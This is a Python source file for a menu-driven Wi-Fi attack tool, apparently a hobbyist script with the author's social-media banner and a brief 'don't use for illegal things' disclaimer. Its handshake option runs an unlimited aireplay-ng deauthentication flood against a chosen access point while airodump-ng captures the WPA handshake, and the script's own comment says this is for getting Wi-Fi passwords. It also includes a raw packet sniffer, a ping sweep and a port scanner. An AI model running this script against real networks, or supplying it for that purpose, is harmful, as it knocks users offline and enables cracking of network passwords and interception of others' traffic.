import os  # for handshake ...
import time  # for slowly ..
import socket  # for port scan ...
from scapy.all import *  # for sniff wifi ...
import subprocess as sp  # for know anyone with you ...
from colorama import Fore  # for color ...
import inquirer # for choose

print('''

 __     __     __     ______   __    
/\ \  _ \ \   /\ \   /\  ___\ /\ \   
\ \ \/ ".\ \  \ \ \  \ \  __\ \ \ \  
 \ \__/".~\_\  \ \_\  \ \_\    \ \_\ 
  \/_/   \/_/   \/_/   \/_/     \/_/ 

     # ############# FOLLOW ME ###############
     # instagram ---> @d_5tr                 #
     # team ---> @zer0one_01                 #
     # telegram ---> https://t.me/d5tr_cyber #
     ######################################### 
--------------------------------------------------------|
                                                        |
don't use tool In illegal things !!                     | 
                                                        | 
this tool for wifi only !!                              |
                                                        |
Don't forget a you must be root !!                      | 
                                                        |
enjoy ...                                               |
                                                        |
--------------------------------------------------------|
''')

# if root or not :
root = os.getuid()

time.sleep(2.5)

if root == 0:
    pass

else:
    print('[!!] Error : you must be root !! \n use " sudo su " and type password next step run tool ')
    exit()

os.system('clear')


def d5tr():
    print(Fore.LIGHTWHITE_EX + '''
       ______________________________
 / \                             \.
|   |                            |.
 \_ |                            |.
    |                            |.
    |                            |.
    |   INSTA-->@d_5tr           |.
    |                            |.
    |    TEAM-->zer0one_01       |.
    |                            |.
    |    NETWORK THE BEST FIELD  |.
    |                            |.
    |     don't use tool for     |.
    |     Illegal things         |.
    |                            |.
    |   _________________________|___
    |  /                            /.
    \_/____________________________/.


    [1] Handshake
    [2] Sniff
    [3] Know ip with you
    [4] Port scan 
    [99] exit
    ''')
    import inquirer
    questions = [
        inquirer.List('size',
                      message="Choose Number ",
                      choices=[1, 2, 3, 4, 99],
                      ),
    ]
    what = inquirer.prompt(questions)

    if what['size'] == 1:  # handshake = this can get password wifi with wirsharck ...

        try:
            os.system('airmon-ng start wlan0')  # start wlan0

            os.system('airodump-ng wlan0mon')  # start see wi-fi

            if KeyboardInterrupt:
                bssid = input('[X] Enter Bssid :')  # for next step
                chn = int(input('[X] Enter Chnnal :'))  # ++
                os.system('airodump-ng wlan0mon -d ' + bssid)  # to see anyone connct with wi-fi
                if KeyboardInterrupt:

                    os.system(
                        f"xterm -hold -e airodump-ng -w hack1 -c {chn} --bssid {bssid} wlan0mon & xterm -hold -e aireplay-ng --deauth 0 -a {bssid} wlan0mon ")  # this for open termnal and type ...

                    if KeyboardInterrupt:  # if exit return to the beginning
                        os.system('airmon-ng stop wlan0mon')  # stop wlan0

                        clear = input('[X] Do You Went Clear ? [ Y , N ] :')
                        if clear == 'Y':
                            print('clear now ...')
                            time.sleep(0.5)
                            os.system('clear')
                        d5tr()
        except:
            print('plz be root !!')


    elif what['size'] == 2:  # sniff wifi

        wlan = input('[X] Enter number wifi ( wlan[?] ):')

        wlan_is = 'wlan' + str(wlan)

        def analyzer(pkt):  # for TCP ...
            if pkt.haslayer(TCP):
                print("===============================")
                print(Fore.RED + "<<<  TCP  >>>")
                src_ip = pkt[IP].src  # الايبي
                dst_ip = pkt[IP].dst
                mac_src = pkt.src  # الماك ادرس
                mac_dst = pkt.dst
                src_port = pkt.sport  # البورت الي طلع منه
                dst_port = pkt.dport
                print("mac_src = " + mac_src)
                print("mac_dst = " + mac_dst)
                print("+")
                print("src = " + src_ip)
                print("dst = " + dst_ip)
                print("+")
                print("src_port = " + str(src_port))
                print("dst_port = " + str(dst_port))
                if pkt.haslayer(Raw):
                    print(pkt[Raw].load)  # for print the pkt !!
                print("packet_size = " + str(len(pkt[TCP])))
                print("================================")
            elif pkt.haslayer(UDP):  # for UDP ...
                print("================================")
                print(Fore.LIGHTBLUE_EX + "<<<  UDP  >>>")
                src_ip = pkt[IP].src
                dst_ip = pkt[IP].dst
                mac_src = pkt.src
                mac_dst = pkt.dst
                src_port = pkt.sport  # البورت الي طلع منه
                dst_port = pkt.dport
                print("mac_src = " + mac_src)
                print("mac_dst =" + mac_dst)
                print("+")
                print("src_ip = " + src_ip)
                print("dst_ip = " + dst_ip)
                print("+")
                print("src_port = " + str(src_port))
                print("dst_port = " + str(dst_port))
                if pkt.haslayer(Raw):
                    print(pkt[Raw].load)
                print("packet_size = " + str(len(pkt[UDP])))
                print("===============================")

        print("*********START*********")
        sniff(iface=wlan_is, prn=analyzer)

        if KeyboardInterrupt:
            clear = input('[X] Do You Went Clear ? [ Y , N ] :')
            if clear == 'Y':
                print('clear now ...')
                time.sleep(0.5)
                os.system('clear')

            d5tr()  # back

    elif what['size'] == 3:
        ip4 = input('[X] Enter third number for your wifi [ 192.168.[?].1 ] :')  # to know start
        n = 1  # to plus

        for x in range(50):
            ip = '192.168.' + str(ip4) + '.' + str(n)

            status, result = sp.getstatusoutput("ping -c 1 " + ip)  # ping !!

            if (status == 0):
                print('[X] Found : ', ip)

            else:
                pass

            n = n + 1  # plus here <:

    elif what['size'] == 4:  # port scan
        host = input('[X] Enter IP : ')
        try:
            for port in range(1, 1024):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                socket.setdefaulttimeout(1)
                result = s.connect_ex((host, port))  # scan
                if result == 0:
                    def non():
                        print('------------------')

                    name_port = socket.getservbyport(port)  # get name port
                    print(f"[X] port {port} / {name_port} open  ")
                    non()

        except:
            print("Error : can't scan ip or wifi can't scan !!")

        if KeyboardInterrupt:
            clear_4 = input('[X] Do you went clear ? [ Y , N ] :')

            if clear_4 == 'Y':
                print('cler now ...')
                time.sleep(0.5)
                os.system('clear')
            d5tr()



    elif what['size'] == 99:  # exit !!
        print('GOOD BAY ...')
        exit()


# start the tool ...
d5tr()